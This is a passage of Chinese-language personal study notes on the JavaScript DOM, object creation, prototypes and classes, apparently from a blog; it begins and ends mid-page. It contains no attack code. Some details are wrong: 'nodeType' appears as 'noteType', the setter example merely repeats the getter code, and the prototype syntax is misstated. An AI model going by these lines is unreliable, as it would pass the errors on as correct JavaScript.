title="更改HTML内容"></a>更改HTML内容</h4><p>使用<strong>innerHTML</strong>属性，语法如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">element.innerHTML</span> = text</span><br></pre></td></tr></table></figure><p>须知：利用各种选择器返回的是元素对象。</p><h4 id="改变输出流"><a href="#改变输出流" class="headerlink" title="改变输出流"></a>改变输出流</h4><p>使用**document.write()**方法</p><p>须知：此方法仅在解析该文档时将内容写入当前文档。如果在页面加载后使用此方法，它将覆盖该文档中的所有现有内容。</p><h4 id="更改属性值"><a href="#更改属性值" class="headerlink" title="更改属性值"></a>更改属性值</h4><p>语法：element.attribute &#x3D; new value</p><h4 id="向DOM添加新元素"><a href="#向DOM添加新元素" class="headerlink" title="向DOM添加新元素"></a>向DOM添加新元素</h4><p><strong>document.createElement()</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> new_h = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;h2&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> new_h_con = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&#x27;HHHHH&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    new_h.<span class="title function_">appendChild</span>(new_h_con);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(new_h);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>appendChild()方法将新元素添加到指定父节点的任何其他子节点的<strong>末尾</strong>。</p><p><strong>body.insertBefore()</strong></p><p>但是，如果要在其他任何子项的<strong>开头</strong>添加新元素，则可以使用该insertBefore()方法.</p><p>语法：body.insertBefore(newElement, body.childNodes[n]);</p><p>从1开始，在n前面。</p><h4 id="从DOM中删除现有元素"><a href="#从DOM中删除现有元素" class="headerlink" title="从DOM中删除现有元素"></a>从DOM中删除现有元素</h4><p>该removeChild()方法从DOM中删除子节点，如下：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> <span class="keyword">div</span> = document.getElementById(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line"><span class="keyword">div</span>.removeChild(<span class="keyword">div</span>.firstElementChild);</span><br></pre></td></tr></table></figure><h3 id="JS-DOM-改变CSS"><a href="#JS-DOM-改变CSS" class="headerlink" title="JS DOM 改变CSS"></a>JS DOM 改变CSS</h3><blockquote><p>使用<a href="https://www.cainiaojc.com/jsref/elem_style.html">style</a>属性将样式应用于特定的HTML元素。</p></blockquote><p>语法：element.style.property &#x3D; ‘value’</p><p>要获取实际上用于呈现元素的所有CSS属性的值，可以使用以下window.getComputedStyle()方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> para = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> compStyles = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(para);</span><br></pre></td></tr></table></figure><h3 id="JS-DOM-改变元素属性"><a href="#JS-DOM-改变元素属性" class="headerlink" title="JS DOM 改变元素属性"></a>JS DOM 改变元素属性</h3><h4 id="获取元素的属性值"><a href="#获取元素的属性值" class="headerlink" title="获取元素的属性值"></a>获取元素的属性值</h4><p>getAttribute()方法用于获取元素上指定属性的当前值。</p><p>语法：var a &#x3D; element.getAttribute(property)</p><h4 id="在元素上设置属性"><a href="#在元素上设置属性" class="headerlink" title="在元素上设置属性"></a>在元素上设置属性</h4><p>setAttribute()方法用于设置指定元素上的属性的值。</p><p>如果属性已经存在，则更新值；否则，将添加具有指定名称和值的新属性。</p><p>语法：element.setAttribute(property, ex)</p><p>将元素element的属性property设置为ex</p><h4 id="从元素中删除属性"><a href="#从元素中删除属性" class="headerlink" title="从元素中删除属性"></a>从元素中删除属性</h4><p>removeAttribute()方法用于从指定元素中删除属性。</p><p>语法：element.removeAttribute(property)</p><h3 id="JS-DOM的Navigation"><a href="#JS-DOM的Navigation" class="headerlink" title="JS DOM的Navigation"></a>JS DOM的Navigation</h3><h4 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h4><blockquote><p>根据W3C HTML DOM标准，HTML文档中的所有内容都是一个节点：</p><ul><li>整个文档是一个文档节点</li><li>每个HTML元素都是一个元素节点</li><li>HTML元素内的文本是文本节点</li><li>每个HTML属性都是一个属性节点（不建议使用）</li><li>所有注释都是注释节点</li></ul></blockquote><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/html_dom_tree.png" alt="DOM HTML树"></p><h4 id="在节点之间导航"><a href="#在节点之间导航" class="headerlink" title="在节点之间导航"></a>在节点之间导航</h4><p>使用以下节点属性来导航：</p><ul><li>parentNode</li><li>childNodes[<em>nodenumber</em>]</li><li>firstChild</li><li>lastChild</li><li>nextSibling</li><li>previousSibling</li></ul><h5 id="访问子节点"><a href="#访问子节点" class="headerlink" title="访问子节点"></a>访问子节点</h5><p>使用：element.childNode[]</p><p>附：</p><p>使用<strong>firstChild</strong>DOM节点的属性来访问节点的第一个直接子节点</p><p>但是由于代码的规范化，两个标签间会有换行和空格，会创建一个**#text**节点。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Node<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">            HELLO</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> father = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;4&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> child = father.<span class="property">firstChild</span>.<span class="property">textContent</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;5&#x27;</span>).<span class="property">innerHTML</span> = child;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将目标作为自己的父节点，可以获取自身文本内容。</p><p>附：nodeName是element的一个只读属性，返回当前节点作为字符串的名称。</p><h5 id="访问父节点"><a href="#访问父节点" class="headerlink" title="访问父节点"></a>访问父节点</h5><p>语法：element.parentElement</p><h5 id="访问兄弟节点"><a href="#访问兄弟节点" class="headerlink" title="访问兄弟节点"></a>访问兄弟节点</h5><p>使用<strong>previousSibling</strong>和<strong>nextSibling</strong>属性来访问DOM树中的上一个和下一个节点。</p><h5 id="DOM根节点"><a href="#DOM根节点" class="headerlink" title="DOM根节点"></a>DOM根节点</h5><p>以下两个属性允许访问整个文档：</p><ul><li>document.body(head)</li><li>document.documentElement</li></ul><p>附：document.documentElement的功能更强大，可以显示<html>标签里的所有内容。</p><h5 id="noteType属性"><a href="#noteType属性" class="headerlink" title="noteType属性"></a>noteType属性</h5><p>该属性以数字形式返回指定节点的节点类型</p><p>语法：element.noteType</p><p>下表列出了最重要的节点类型：</p><table><thead><tr><th>ELEMENT_NODE</th><th>1</th><th><p class="heading">Hello, World</p></th></tr></thead><tbody><tr><td>ATTRIBUTE_NODE</td><td>2</td><td>class &#x3D;“heading”（不建议使用）</td></tr><tr><td>TEXT_NODE</td><td>3</td><td>Hello, World</td></tr><tr><td>COMMENT_NODE</td><td>8</td><td>&lt;！–这是注释–&gt;</td></tr><tr><td>DOCUMENT_NODE</td><td>9</td><td>HTML文档本身（<html>的父级）</td></tr><tr><td>DOCUMENT_TYPE_NODE</td><td>10</td><td>&lt;！doctype html&gt;</td></tr></tbody></table><h2 id="JavaScript对象-1"><a href="#JavaScript对象-1" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="概述：-2"><a href="#概述：-2" class="headerlink" title="概述："></a>概述：</h4><blockquote><p>对象是由<strong>属性</strong>和<strong>方法</strong>的集合组成的数据类型。</p></blockquote><blockquote><p>在JavaScript中，基本上所有东西都是对象：</p><ul><li>字符串可以是对象（如果使用new关键字定义）</li><li>数字可以是对象（如果使用new关键字定义）</li><li>布尔值可以是对象（如果使用new关键字定义）</li><li>日期始终是对象</li><li>数学永远是对象</li><li>数组始终是对象</li><li>正则表达式始终是对象</li><li>函数永远是对象</li><li>Object就是对象</li></ul><p>除原语外，所有JavaScript值都是对象。</p></blockquote><p>附：在Java编程语言中，原语（primitive）指的是一组基本的数据类型，它们不是对象，也不具有方法。</p><h4 id="JavaScript基元"><a href="#JavaScript基元" class="headerlink" title="JavaScript基元"></a>JavaScript基元</h4><p>原始值是没有属性或方法的值。</p><p>在JavaScript中，有5种原始类型：</p><ul><li>string</li><li>number</li><li>boolean</li><li>null</li><li>undefined</li></ul><h3 id="创建JavaScript对象"><a href="#创建JavaScript对象" class="headerlink" title="创建JavaScript对象"></a>创建JavaScript对象</h3><p>终于详细讨论这个问题了。</p><blockquote><p>有多种创建新对象的方法：</p><ul><li>使用<strong>对象常量</strong>，它使用大括号：{}</li><li>使用<strong>对象构造函数</strong>，它使用new Object()</li><li>可以创建一个<strong>构造函数</strong>  ，然后示例化一个调用该函数的对象</li></ul></blockquote><h4 id="使用对象常量"><a href="#使用对象常量" class="headerlink" title="使用对象常量"></a>使用对象常量</h4><p>例子：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">var Pq</span> = &#123;name: <span class="string">&#x27;pq&#x27;</span>, age:20&#125;;</span><br></pre></td></tr></table></figure><p>附：对象定义可以跨越多行。</p><h4 id="使用new-Object"><a href="#使用new-Object" class="headerlink" title="使用new Object()"></a>使用<strong>new Object()</strong></h4><p>例子（哈哈哈，我简化了）：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var <span class="keyword">user</span> = &#123;&#125;;</span><br><span class="line"><span class="keyword">user</span>.name = <span class="string">&#x27;pq&#x27;</span>;</span><br><span class="line"><span class="keyword">user</span>.age = <span class="number">20</span>;</span><br></pre></td></tr></table></figure><h4 id="使用构造函数"><a href="#使用构造函数" class="headerlink" title="使用构造函数"></a>使用构造函数</h4><p>例子：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Man</span><span class="params">(name, age)</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> Pq = <span class="keyword">new</span> Man(<span class="string">&#x27;pq&#x27;</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure><h4 id="JavaScript对象是可变的"><a href="#JavaScript对象是可变的" class="headerlink" title="JavaScript对象是可变的"></a>JavaScript对象是可变的</h4><blockquote><p>可变是一种可以更改的变量。在JavaScript中，只有对象和数组是可变的，不是原始值。</p><p><strong>可变对象</strong>是一种对象，其状态在创建后即可修改。</p><p><strong>不可变</strong>对象是一旦创建对象便无法更改其状态的对象。</p></blockquote><p><strong>字符串</strong>和<strong>数字</strong>是<strong>不可变的</strong>，改值后地址变了。</p><p>对象是可变的：它们是通过引用而不是值来寻址的。</p><blockquote><p>如果user是对象，则以下语句将不会创建该用户的副本：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x <span class="operator">=</span> user<span class="comment">;  // 这不会创建user副本.</span></span><br></pre></td></tr></table></figure><p>对象x不是user的副本，它是user。x和user是同一个对象。</p><p>对x的任何更改也将更改user，因为x和user是相同的对象。</p></blockquote><h4 id="比较对象"><a href="#比较对象" class="headerlink" title="比较对象"></a>比较对象</h4><p>在JavaScript中，对象是引用类型。即使两个不同的对象具有相同的属性，它们也永远不会相等。</p><p>仅将<strong>同一对象</strong>引用与其自身进行比较会得出<strong>true</strong>。</p><h3 id="JavaScript-对象属性"><a href="#JavaScript-对象属性" class="headerlink" title="JavaScript 对象属性"></a>JavaScript 对象属性</h3><blockquote><p><strong>属性</strong>是对象内的名称（键）和值之间的关联，并且它可以包含任何数据类型。</p><p><strong>属性</strong>通常是指一个对象的特征。</p><p>通常可以更改，添加和删除属性，但某些属性是只读的。</p></blockquote><h4 id="访问JavaScript属性"><a href="#访问JavaScript属性" class="headerlink" title="访问JavaScript属性"></a>访问JavaScript属性</h4><p>有两种访问对象属性的方法：</p><ul><li>点表示法： .</li><li>括号符号： []</li></ul><h4 id="添加新，修改旧属性"><a href="#添加新，修改旧属性" class="headerlink" title="添加新，修改旧属性"></a>添加新，修改旧属性</h4><p>直接使用等于号，</p><p>注意：避免对属性或方法名称使用保留字。</p><h4 id="删除对象属性"><a href="#删除对象属性" class="headerlink" title="删除对象属性"></a>删除对象属性</h4><p>语法：delete element.property</p><h4 id="遍历对象属性"><a href="#遍历对象属性" class="headerlink" title="遍历对象属性"></a>遍历对象属性</h4><p>JavaScript具有<strong>for…in</strong>专门用于迭代对象属性的循环。</p><p>语法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (variable <span class="keyword">in</span> <span class="keyword">object</span>) &#123; <span class="keyword">statement</span> <span class="keyword">to</span> be executed&#125;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var <span class="keyword">user</span> <span class="title">= &#123;firstName</span>:<span class="string">&quot;Seagull&quot;</span>, lastName:<span class="string">&quot;Anna&quot;</span>, age:<span class="number">22</span>, location:<span class="string">&quot;New Delhi&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">for (let x <span class="keyword">in</span> user) &#123;</span><br><span class="line">    document.<span class="keyword">write</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附：<a href="https://www.cainiaojc.com/jsref/for_in.html">for…in</a>循环不应与<a href="https://www.cainiaojc.com/jsref/for_of.html">for…of</a>循环混淆，后者仅在Array对象类型上使用。</p><p>另一个有用的枚举方法是Object.keys()方法，该方法将返回对象属性的数组。</p><p>语法：object.keys(对象)</p><blockquote><p>此方法使我们可以将对象的属性作为数组使用，因此您可以利用JavaScript数组的所有方法。</p></blockquote><p>附：属性的内部属性</p><blockquote><p>所有属性都有一个名称。另外它们也有属性值。</p><p>该值是属性的属性之一。</p><p>其他属性是：可枚举，可配置和可写。</p><p>这些属性定义了属性的访问方式（可读性，可写性）。</p><p>在JavaScript中，可以读取所有属性，但是只能更改属性值（并且仅在该属性为可写状态时）。</p></blockquote><h3 id="JavaScript-对象方法"><a href="#JavaScript-对象方法" class="headerlink" title="JavaScript 对象方法"></a>JavaScript 对象方法</h3><h4 id="概述：-3"><a href="#概述：-3" class="headerlink" title="概述："></a>概述：</h4><blockquote><p><strong>方法</strong>是与对象，或者说相关联的函数，一种方法是一个对象，它是函数的一个属性。</p><p>方法的定义方式与常规函数的定义方式相同，不同之处在于必须将它们分配为对象的属性。</p></blockquote><h4 id="使用this作为对象引用"><a href="#使用this作为对象引用" class="headerlink" title="使用this作为对象引用"></a>使用this作为对象引用</h4><blockquote><p>JavaScript有一个特殊的关键字this，您可以在方法中使用它来引用当前对象。</p></blockquote><p>如下：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getName: function() &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">&quot; &quot;</span> + <span class="keyword">this</span>.lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>this关键字是指代码被写入内部当前对象-所以在这种情况下，this等同于<strong>user</strong>。</p><p>换句话说，this.firstName表示<strong>此对象</strong>的firstName属性。</p></blockquote><h4 id="添加新方法"><a href="#添加新方法" class="headerlink" title="添加新方法"></a>添加新方法</h4><p>直接等于号，如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.greet <span class="operator">=</span> function() &#123;</span><br><span class="line">    return <span class="string">&quot;Hello World&quot;</span><span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line">document.getElementById(<span class="string">&quot;para&quot;</span>).innerHTML <span class="operator">=</span> user.greet()<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="Getters和Setters"><a href="#Getters和Setters" class="headerlink" title="Getters和Setters"></a>Getters和Setters</h4><p>getter是一种获取特定属性值的方法。</p><p>setter是一种设置特定属性值的方法。</p><p>例子：get关键字</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">var</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&quot;Seagull&quot;</span>,</span><br><span class="line">  lastName : <span class="string">&quot;Anna&quot;</span>,</span><br><span class="line">  age  : <span class="number">22</span>,</span><br><span class="line">  location : <span class="string">&quot;New Delhi&quot;</span>,</span><br><span class="line">  <span class="function"><span class="keyword">get</span> <span class="title">loc</span>()</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">this</span>.location;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示来自对象的数据</span></span><br><span class="line">document.getElementById(<span class="string">&quot;para&quot;</span>).innerHTML = user.loc;</span><br></pre></td></tr></table></figure><p>还有：set关键字</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">var</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&quot;Seagull&quot;</span>,</span><br><span class="line">  lastName : <span class="string">&quot;Anna&quot;</span>,</span><br><span class="line">  age  : <span class="number">22</span>,</span><br><span class="line">  location : <span class="string">&quot;New Delhi&quot;</span>,</span><br><span class="line">  <span class="function"><span class="keyword">get</span> <span class="title">loc</span>()</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">this</span>.location;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示来自对象的数据</span></span><br><span class="line">document.getElementById(<span class="string">&quot;para&quot;</span>).innerHTML = user.loc;</span><br></pre></td></tr></table></figure><h4 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h4><p>Object.defineProperty()方法还可以用于添加Getter和Setter。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Object</span><span class="selector-class">.defineProperty</span>(<span class="selector-tag">object</span>, property, &#123;value : value&#125;)</span><br></pre></td></tr></table></figure><h3 id="JavaScript-对象构造函数"><a href="#JavaScript-对象构造函数" class="headerlink" title="JavaScript 对象构造函数"></a>JavaScript 对象构造函数</h3><p>JavaScript 内置构造函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x1 = <span class="keyword">new</span> <span class="title class_">String</span>(); <span class="comment">//一个新的String对象。</span></span><br><span class="line"><span class="keyword">let</span> x2 = <span class="keyword">new</span> <span class="title class_">Number</span>(); <span class="comment">//一个新的number对象。</span></span><br><span class="line"><span class="keyword">let</span> x3 = <span class="keyword">new</span> <span class="title class_">Boolean</span>(); <span class="comment">//一个新的布尔对象。</span></span><br><span class="line"><span class="keyword">let</span> x4 = <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">//一个新Object对象。</span></span><br><span class="line"><span class="keyword">let</span> x5 = <span class="keyword">new</span> <span class="title class_">Array</span>(); <span class="comment">//一个新的Array对象。</span></span><br><span class="line"><span class="keyword">let</span> x6 = <span class="keyword">new</span> <span class="title class_">RegExp</span>(); <span class="comment">//一个新的RegExp对象。</span></span><br><span class="line"><span class="keyword">let</span> x7 = <span class="keyword">new</span> <span class="title class_">Date</span>(); <span class="comment">//一个新的date对象。</span></span><br><span class="line"><span class="keyword">let</span> x8 = <span class="keyword">new</span> <span class="title class_">Function</span>(); <span class="comment">//一个新函数对象。</span></span><br></pre></td></tr></table></figure><h4 id="不要将Number、String或Boolean声明为对象"><a href="#不要将Number、String或Boolean声明为对象" class="headerlink" title="不要将Number、String或Boolean声明为对象"></a>不要将Number、String或Boolean声明为对象</h4><blockquote><p>终将数字，字符串或布尔值视为原始值。不作为对象。</p><p>将这些类型声明为对象会降低执行速度，并产生意外结果。</p></blockquote><p>也可以这样做：</p><ul><li>使用{}代替new Object()</li><li>使用””代替new String()</li><li>使用0代替new Number()</li><li>使用false代替new Boolean()</li><li>使用[]代替new Array()</li><li>使用&#x2F;()&#x2F;代替new RegExp()</li><li>使用function (){}代替new Function()</li></ul><h3 id="JavaScript-对象原型及原型链"><a href="#JavaScript-对象原型及原型链" class="headerlink" title="JavaScript 对象原型及原型链"></a>JavaScript 对象原型及原型链</h3><h4 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h4><blockquote><p><strong>原型</strong>是一种机制，JavaScript对象通过该机制彼此继承特征。</p></blockquote><p>prototype属性可以向构造函数添加属性和方法。</p><p>语法：object.property.name &#x3D; value</p><h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><p>部分内容摘自：<a href="https://juejin.cn/post/6984678359275929637">一文搞懂JS原型与原型链（超详细，建议收藏） - 掘金 (juejin.cn)</a></p><h5 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h5><blockquote><p>JS的每个函数在创建的时候，都会生成一个属性<code>prototype</code>，这个属性指向一个对象，这个对象就是此函数的<code>原型对象</code>。该<code>原型对象</code>中有个属性为<code>constructor</code>，指向该函数。这样<code>原型对象</code>和<code>它的函数</code>之间就产生了联系。</p></blockquote><h5 id="JS原型链"><a href="#JS原型链" class="headerlink" title="JS原型链"></a>JS原型链</h5><p>每个通过<code>构造函数</code>创建出来的<code>实例对象</code>，其本身有个属性<code>__proto__</code>，这个属性会指向该<code>实例对象</code>的<code>构造函数</code>的<code>原型对象</code>。</p><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1141452b532f4e9cab03ba48f58beadetplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp" alt="image.png"></p><blockquote><p>当访问一个<code>对象</code>的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的<code>__proto__</code>隐式属性，找到它的<code>构造函数</code>的<code>原型对象</code>，如果还没有找到就会再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找，这样一层一层向上查找就会形成一个链式结构，我们称为<code>原型链</code>。</p></blockquote><blockquote><p><strong>注意点</strong>：如果通过<code>p1实例对象</code>的<code>__proto__</code>属性赋值，则会改变其<code>构造函数</code>的<code>原型对象</code>，从而被所有实例所共享。</p></blockquote><p>原型链的尽头是NULL。</p><p>神评：</p><blockquote><p>每个构造函数：例如Array都有自己的原型对象 Prototype, 而 Array每次new 出来的实例对象 array &#x3D; new Array() 如果想找到 原型对象 Prototype上面的属性的话，得通过 <strong>proto</strong> 来找到（也就是 arrar.<strong>proto</strong> &#x3D;&#x3D;&#x3D; Array.Prototype）; 但是Array的原型对象 Prototype的上层其实还有 <strong>proto</strong>, 而它的__proto__指向的就是 Object.Prototype ; 也就是Array.Prototype._<em>proto</em></p></blockquote><p>自我总结：每个构造函数抽象出一个原型对象以承载公共属性和方法，原型链使对象与构造函数的原型对象建立link。</p><h3 id="JavaScript-类"><a href="#JavaScript-类" class="headerlink" title="JavaScript 类"></a>JavaScript 类</h3><h4 id="概述：-4"><a href="#概述：-4" class="headerlink" title="概述："></a>概述：</h4><p><strong>类是用于创建对象的模板。</strong></p><p>创建一个类并实例化的语法格式如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Runoob</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, url</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">url</span> = url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> site = <span class="keyword">new</span> <span class="title class_">Runoob</span>(<span class="string">&quot;菜鸟教程&quot;</span>,  <span class="string">&quot;https://www.runoob.com&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h4><blockquote><p><strong>super()</strong> 方法引用父类的构造方法。</p><p>通过在构造方法中调用 <strong>super()</strong> 方法，我们调用了父类的构造方法，这样就可以访问父类的属性和方法。</p></blockquote><p>语法： 